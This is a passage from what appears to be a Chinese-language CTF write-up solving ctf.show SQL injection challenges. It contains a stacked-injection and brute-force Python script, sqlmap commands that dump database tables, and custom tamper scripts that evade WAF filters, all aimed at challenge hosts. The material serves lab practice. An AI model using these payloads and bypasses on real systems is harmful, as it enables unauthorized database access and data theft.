<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://3e88c41f-6b50-41ed-9002-e37799200c7c.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alter_table</span>():</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;0;alter table ctfshow_user change column pass tmp text;alter table ctfshow_user change &quot;</span></span><br><span class="line">                    <span class="string">&quot;column id pass int;alter table ctfshow_user change column tmp id text&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    _ = requests.post(url, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">success_flag = <span class="string">&quot;\\u767b\\u9646\\u6210\\u529f&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force_admin</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;0x<span class="subst">&#123;<span class="string">&#x27;admin&#x27;</span>.encode().<span class="built_in">hex</span>()&#125;</span>&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> success_flag <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] msg: <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] change column id to pass&quot;</span>)</span><br><span class="line">    alter_table()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] brute force admin password&quot;</span>)</span><br><span class="line">    brute_force_admin()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web200"><a href="#web200" class="headerlink" title="web200"></a>web200</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;/\*|\#|\-|\x23|\&#x27;|\&quot;|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop|\(|\,/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="number">0</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有过滤的数字型注入，没有过滤分号可堆叠注入，上一题脚本一把梭。    </p>
<h2 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"><span class="comment">//代码过于简单，不宜展示</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>sqlmap 工具使用练习。<br>题目提示 –user-agent 指定 user-agent，实际上不是 sqlmap 的 ua 还不让访问，测试 ua <code>sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)</code> 可用。<br>题目还指定使用 –referer 绕过 referer 检查，带着 sqlmap 的 ua 访问会提示“打击盗版人人有责，你都不是从ctf.show来的”，故指定 referer 为 ctf.show。    </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检测注入类型</span></span><br><span class="line">$ sqlmap http://cd31c7e8-9d3a-4f97-b5b5-7eb0d38d23e0.challenge.ctf.show:8080/api/?<span class="built_in">id</span>=1 --referer=<span class="string">&quot;ctf.show&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 出库名</span></span><br><span class="line">$ sqlmap http://cd31c7e8-9d3a-4f97-b5b5-7eb0d38d23e0.challenge.ctf.show:8080/api/?<span class="built_in">id</span>=1 --referer=<span class="string">&quot;ctf.show&quot;</span> -dbs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 出表名</span></span><br><span class="line">$ sqlmap http://cd31c7e8-9d3a-4f97-b5b5-7eb0d38d23e0.challenge.ctf.show:8080/api/?<span class="built_in">id</span>=1 --referer=<span class="string">&quot;ctf.show&quot;</span> -D <span class="string">&quot;ctfshow_web&quot;</span> --tables</span><br><span class="line"></span><br><span class="line"><span class="comment"># 出数据</span></span><br><span class="line">$ sqlmap http://cd31c7e8-9d3a-4f97-b5b5-7eb0d38d23e0.challenge.ctf.show:8080/api/?<span class="built_in">id</span>=1 --referer=<span class="string">&quot;ctf.show&quot;</span> -D <span class="string">&quot;ctfshow_web&quot;</span> -T <span class="string">&quot;ctfshow_user&quot;</span> --dump</span><br></pre></td></tr></table></figure>
<p>数据中找到 flag。    </p>
<h2 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">   <span class="comment">//代码过于简单，不宜展示</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>sqlmap 工具使用练习。<br>题目强调使用 –data 指定 sqlmap 以 post 方式提交数据。    </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap -u <span class="string">&quot;http://5d506c45-1336-4345-858f-1de6dacef1a1.challenge.ctf.show:8080/api/&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> --level=3 --risk=3    </span><br><span class="line">$ sqlmap -u <span class="string">&quot;http://5d506c45-1336-4345-858f-1de6dacef1a1.challenge.ctf.show:8080/api/&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> --level=3 --risk=3 --dbs</span><br><span class="line">$ sqlmap -u <span class="string">&quot;http://5d506c45-1336-4345-858f-1de6dacef1a1.challenge.ctf.show:8080/api/&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> --level=3 --risk=3 --D <span class="string">&quot;ctfshow_web&quot;</span> --tables</span><br><span class="line">$ sqlmap -u <span class="string">&quot;http://5d506c45-1336-4345-858f-1de6dacef1a1.challenge.ctf.show:8080/api/&quot;</span> --data=<span class="string">&quot;id=1&quot;</span> --level=3 --risk=3 -D <span class="string">&quot;ctfshow_web&quot;</span> -T <span class="string">&quot;ctfshow_user&quot;</span> --dump</span><br></pre></td></tr></table></figure>

<p>数据中找到 flag。    </p>
<h2 id="web203"><a href="#web203" class="headerlink" title="web203"></a>web203</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">   <span class="comment">//代码过于简单，不宜展示</span></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>sqlmap 工具使用练习。<br>–method 指定 put 请求方式，url 要带 index.php，还要加上 –headers=”Content-Type: text/plain” 便于 put 接收表单参数。    </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap -u <span class="string">&quot;http://c9d3e765-d676-4c4c-a87b-3b99ebf5e70b.challenge.ctf.show:8080/api/index.php&quot;</span> --method=put --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --referer=ctf.show -D ctfshow_web -T ctfshow_user --dump</span><br></pre></td></tr></table></figure>

<h2 id="web204"><a href="#web204" class="headerlink" title="web204"></a>web204</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,password from ctfshow_user where username !=&#x27;flag&#x27; and id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">     </span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">   <span class="comment">//代码过于简单，不宜展示</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>sqlmap 工具使用练习。<br>–cookie 带上 PHPSESSID，其余不变。    </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap -u <span class="string">&quot;http://38e4a4ea-fb61-45cd-81cb-2f96697a5d0f.challenge.ctf.show:8080/api/index.php&quot;</span> --method=put --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=rj2j2j2ool1bbkj2sps4u1m0ml; ctfshow=cbbfc316f35593f84f3ae1c60b64df16&quot;</span> --referer=ctf.show -D ctfshow_web -T ctfshow_user --dump</span><br></pre></td></tr></table></figure>

<h2 id="web205"><a href="#web205" class="headerlink" title="web205"></a>web205</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,password from ctfshow_user where id = &#x27;&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">   <span class="comment">//代码过于简单，不宜展示</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>sqlmap 工具使用练习。<br>题目提示 api 调用需要鉴权，查看日志发现 /api/getToken.php 的访问，设置参数 –safe-url 和 –safe-freq 在调用 api 前访问 token 链接。    </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap -u <span class="string">&quot;http://66b00e8e-9b47-461a-925a-5dc2c3ef9988.challenge.ctf.show:8080/api/index.php&quot;</span> --method=put --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=rj2j2j2ool1bbkj2sps4u1m0ml; ctfshow=cbbfc316f35593f84f3ae1c60b64df16&quot;</span> --referer=ctf.show -D ctfshow_web --safe-url=<span class="string">&quot;http://66b00e8e-9b47-461a-925a-5dc2c3ef9988.challenge.ctf.show:8080/api/getToken.php&quot;</span> --safe-freq=1 -T ctfshow_flax --dump</span><br></pre></td></tr></table></figure>

<h2 id="web206"><a href="#web206" class="headerlink" title="web206"></a>web206</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where id = (&#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27;) limit 0,1;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">   <span class="comment">//代码过于简单，不宜展示</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>sqlmap 工具使用练习。<br>题目提示 sql 需要闭合，但似乎对 sqlmap 没有影响，和上一题相比只变了表名。    </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap -u <span class="string">&quot;http://56856f5f-d186-4e25-827b-5f18cafa3df3.challenge.ctf.show:8080/api/index.php&quot;</span> --method=put --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=rj2j2j2ool1bbkj2sps4u1m0ml; ctfshow=cbbfc316f35593f84f3ae1c60b64df16&quot;</span> --referer=ctf.show -D ctfshow_web --safe-url=<span class="string">&quot;http://56856f5f-d186-4e25-827b-5f18cafa3df3.challenge.ctf.show:8080/api/getToken.php&quot;</span> --safe-freq=1 -T ctfshow_flaxc --dump</span><br></pre></td></tr></table></figure>

<h2 id="web207"><a href="#web207" class="headerlink" title="web207"></a>web207</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where id = (&#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27;) limit 0,1;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ /&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>sqlmap 工具使用练习。<br>题目提示要用 –tamper 加载自己写的 tamper，给出的正则过滤了空格 (<code>%20</code>)，所以要用 tamper 替换一下 Payload 里面的空格。    </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> /usr/share/sqlmap/tamper | grep space</span><br><span class="line">multiplespaces.py</span><br><span class="line">space2comment.py</span><br><span class="line">space2dash.py</span><br><span class="line">space2hash.py</span><br><span class="line">space2morecomment.py</span><br><span class="line">space2morehash.py</span><br><span class="line">space2mssqlblank.py</span><br><span class="line">space2mssqlhash.py</span><br><span class="line">space2mysqlblank.py</span><br><span class="line">space2mysqldash.py</span><br><span class="line">space2plus.py</span><br><span class="line">space2randomblank.py</span><br></pre></td></tr></table></figure>
<p>工具自带了很多空格替换的 tamper，这里使用 sapce2comment 绕过。    </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap -u <span class="string">&quot;http://bc2af829-2f3c-4060-b63c-101630fdfe14.challenge.ctf.show:8080/api/index.php&quot;</span> --method=put --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=rj2j2j2ool1bbkj2sps4u1m0ml; ctfshow=cbbfc316f35593f84f3ae1c60b64df16&quot;</span> --referer=ctf.show -D ctfshow_web --safe-url=<span class="string">&quot;http://bc2af829-2f3c-4060-b63c-101630fdfe14.challenge.ctf.show:8080/api/getToken.php&quot;</span> --safe-freq=1 --tamper=space2comment -T ctfshow_flaxca --dump</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web208"><a href="#web208" class="headerlink" title="web208"></a>web208</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where id = (&#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27;) limit 0,1;&quot;</span>;</span><br><span class="line">      </span><br><span class="line">返回逻辑</span><br><span class="line"></span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="comment">// $id = str_replace(&#x27;select&#x27;, &#x27;&#x27;, $id);</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ /&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>sqlmap 工具使用练习。<br>和上一题差不多，就变了表名。    </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap -u <span class="string">&quot;http://c5edaa62-dac4-41f9-aab7-2c8c0f734bcd.challenge.ctf.show:8080/api/index.php&quot;</span> --method=put --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=rj2j2j2ool1bbkj2sps4u1m0ml; ctfshow=cbbfc316f35593f84f3ae1c60b64df16&quot;</span> --referer=ctf.show -D ctfshow_web --safe-url=<span class="string">&quot;http://c5edaa62-dac4-41f9-aab7-2c8c0f734bcd.challenge.ctf.show:8080/api/getToken.php&quot;</span> --safe-freq=1 --tamper=space2comment -T ctfshow_flaxcac --dump</span><br></pre></td></tr></table></figure>

<h2 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27; limit 0,1;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">   <span class="comment">//TODO 未完工</span></span><br><span class="line">   <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\=/&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>sqlmap 工具使用练习。<br>过滤正则表达式新增过滤 <code>* =</code>，没有现成可用的绕过过滤的 tamper，自己写一个。<br><code>/usr/share/sqlmap/tamper/web209.py</code>    </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="keyword">return</span> payload.replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot; like &quot;</span>).replace(<span class="string">&quot; &quot;</span>, <span class="built_in">chr</span>(<span class="number">0x09</span>))</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap -u <span class="string">&quot;http://1d757578-d745-49b6-ac7d-d8b6ca04b103.challenge.ctf.show:8080/api/index.php&quot;</span> --method=put --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=rj2j2j2ool1bbkj2sps4u1m0ml; ctfshow=cbbfc316f35593f84f3ae1c60b64df16&quot;</span> --referer=ctf.show -D ctfshow_web --safe-url=<span class="string">&quot;http://1d757578-d745-49b6-ac7d-d8b6ca04b103.challenge.ctf.show:8080/api/getToken.php&quot;</span> --safe-freq=1 --tamper=web209 -T ctfshow_flav --dump</span><br></pre></td></tr></table></figure>

<h2 id="web210"><a href="#web210" class="headerlink" title="web210"></a>web210</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//拼接sql语句查找指定ID用户</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where id = &#x27;&quot;</span>.<span class="variable">$id</span>.<span class="string">&quot;&#x27; limit 0,1;&quot;</span>;</span><br><span class="line">      </span><br><span class="line"><span class="comment">//对查询字符进行解密</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$id</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$id</span>))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>sqlmap 工具使用练习，根据给出的解码函数编写 tamper    </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(base64.b64encode(payload[::-<span class="number">1</span>].encode()).decode()[::-<span class="number">1</span>].encode()).decode()</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sqlmap -u <span class="string">&quot;http://97a2abb3-9463-4f0c-b5aa-291bcf252154.challenge.ctf.show:8080/api/index.php&quot;</span> --method=put --data=<span class="string">&quot;id=1&quot;</span> --headers=<span class="string">&quot;Content-Type: text/plain&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=rj2j2j2ool1bbkj2sps4u1m0ml; ctfshow=cbbfc316f35593f84f3ae1c60b64df16&quot;</span> --referer=ctf.show -D ctfshow_web --safe-url=<span class="string">&quot;http://97a2abb3-9463-4f0c-b5aa-291bcf252154.challenge.ctf.show:8080/api/getToken.php&quot;</span> --safe-freq=1 --tamper=web210 -T ctfshow_flavi --dump</span><br></pre></td></tr></table></figure>

